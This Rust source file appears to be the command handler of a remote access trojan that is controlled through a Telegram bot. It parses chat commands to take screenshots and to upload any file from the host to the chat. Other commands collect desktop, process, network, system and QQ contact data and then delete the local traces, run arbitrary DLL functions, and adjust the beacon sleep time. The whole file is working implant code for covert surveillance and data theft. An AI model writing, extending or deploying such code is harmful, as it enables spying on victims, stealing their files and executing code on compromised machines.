use crate::api::*;
use crate::functions::{tg_until::*};
use crate::model;
use regex::Regex;

#[warn(unused_assignments)]
pub async fn match_command(cmd: &String, update_id: i64) {
    let mut sleep_time: u64;
    {
    sleep_time = *SLEEP_TIME.lock().unwrap();
    }

    let upload_regex =
        Regex::new(format!(r"^/upload@{}\s*", BOT_NAME.as_str()).as_str()).expect("regex wrong"); //upload regex
    let sleep_time_regex =
        Regex::new(format!(r"^/set_sleep_time@{}\s\d+$", BOT_NAME.as_str()).as_str())
            .expect("regex wrong"); //upload regex
    // ## 设置睡眠时间
    let setting_info_regex = Regex::new(format!(r"^/setting_info@{}$", BOT_NAME.as_str()).as_str())
        .expect("regex wrong");
    let screen_shot_regex =
        Regex::new(format!(r"^/screen_shot@{}$", BOT_NAME.as_str()).as_str()).expect("regex wrong");
    let info_collect_regex = Regex::new(format!(r"^/info_collect@{}$", BOT_NAME.as_str()).as_str())
        .expect("regex wrong");
    // let set_output_regex =
    //     Regex::new(format!(r"^/set_output_dir@{}$", BOT_NAME.as_str()).as_str()).expect("regex wrong");
    let run_dll_regex =
        Regex::new(format!(r"^/run_dll@{}", BOT_NAME.as_str()).as_str()).expect("regex wrong");

    let disconnect_regex =
        Regex::new(format!(r"^/disconnect@{}", BOT_NAME.as_str()).as_str()).expect("regex wrong");


    match cmd.as_str() {
        s if disconnect_regex.is_match(s) => {
            println!("trigger disconnect");
            tg_tools::sendmessage("断开连接").await;
            std::process::exit(0);
        }
        s if run_dll_regex.is_match(s) => {
            // 如果命令以 /run_dll 开头
            println!("trigger run_dll");
            let sp: Vec<&str> = s.trim().splitn(3, " ").collect();
            if sp.len() != 3 {
                println!("命令格式错误");
                tg_tools::sendmessage("命令格式错误，应遵循/run_dll <dll_name> <function_name>").await;
                return;
            };
            let dll_name = sp[1];
            let function_name = sp[2];
            let _ = crate::functions::run_dll::run_dll(dll_name, function_name);
            return;
        }
        //dev 
        // setting sleep time.
        s if sleep_time_regex.is_match(s) => {
            // 如果命令以 /sleep_time 开头
            println!("trigger sleep_time");
            let sp: Vec<&str> = s.trim().splitn(2, " ").collect();
            if sp.len() != 2 {
                println!("命令格式错误");
                tg_tools::sendmessage("命令格式错误，应遵循/set_sleep_time <time>").await;
                return;
            };
            sleep_time = sp[1].parse::<u64>().unwrap_or(5);
            {
                let mut ptr = SLEEP_TIME.lock().unwrap();
                *ptr = sleep_time as u64;
            }
            println!("time: {}", sleep_time);
            tg_tools::sendmessage(format!("设置睡眠时间成功，当前时间为{}s", sleep_time).as_str())
                .await;
            return;
        }
        // take screen shot photo.
        s if screen_shot_regex.is_match(s) => {
            let _ = model::screen_shot().await;
            return;
        }


        // info_collect
        s if info_collect_regex.is_match(s) => {
            let _ = crate::functions::info_collect_use::info_collect().await;
            // 删除创建的文件
            match std::fs::remove_file(format!("{}/deskfile_info.txt", OUTPUT_DIR.as_str())) {
                Ok(_) => println!("delete sucess"),
                Err(_) => println!("delete fail"),
            };
            match std::fs::remove_file(format!("{}/exe_list.txt", OUTPUT_DIR.as_str())) {
                Ok(_) => println!("delete sucess"),
                Err(_) => println!("delete fail"),
            };
            match std::fs::remove_file(format!("{}/net_info.txt", OUTPUT_DIR.as_str())) {
                Ok(_) => println!("delete sucess"),
                Err(_) => println!("delete fail"),
            };
            match std::fs::remove_file(format!("{}/qq_list.txt", OUTPUT_DIR.as_str())) {
                Ok(_) => println!("delete sucess"),
                Err(_) => println!("delete fail"),
            };
            match std::fs::remove_file(format!("{}/system_info.txt", OUTPUT_DIR.as_str())) {
                Ok(_) => println!("delete sucess"),
                Err(_) => println!("delete fail"),
            };

            return;
        }

        s if upload_regex.is_match(s) => {
            // 如果命令以 /upload 开头
            println!("trigger upload");
            let sp: Vec<&str> = s.trim().splitn(2, " ").collect();
            if sp.len() != 2 {
                println!("命令格式错误");
                tg_tools::sendmessage("命令格式错误，应遵循/upload <file_path>").await;
                return;
            };
            let file_path = sp[1];

            println!("file_path: {}", file_path);
            let _ = crate::functions::tg_until::tg_tools::upload_file(file_path).await;
            return;
        }
        // setting info
        s if setting_info_regex.is_match(s) => {
            println!("trigger setting");
            let pwd = match std::env::current_dir() {
                Ok(dir) => dir.display().to_string(),
                Err(e) => e.to_string(),
            };

            let payload = format!(
                "bot_name: {} ,\n当前请求id: {} ,\n当前目录: {} ,\n输出目录: {} ,\nCHAT_ID: {} ,\nMESSAGE_THREAD_ID: {} ,\nSLEEP_TIME: {}s ,\n机器时间: {} ",
                BOT_NAME.as_str(),
                update_id,
                pwd,
                OUTPUT_DIR.as_str(),
                CHAT_ID.as_str(),
                MESSAGE_THREAD_ID.lock().unwrap(),
                SLEEP_TIME.lock().unwrap(),
                chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string()
            );
            tg_tools::sendmessage(&payload).await;
            return;
        }

        _ => {
            return;
        }
    }
}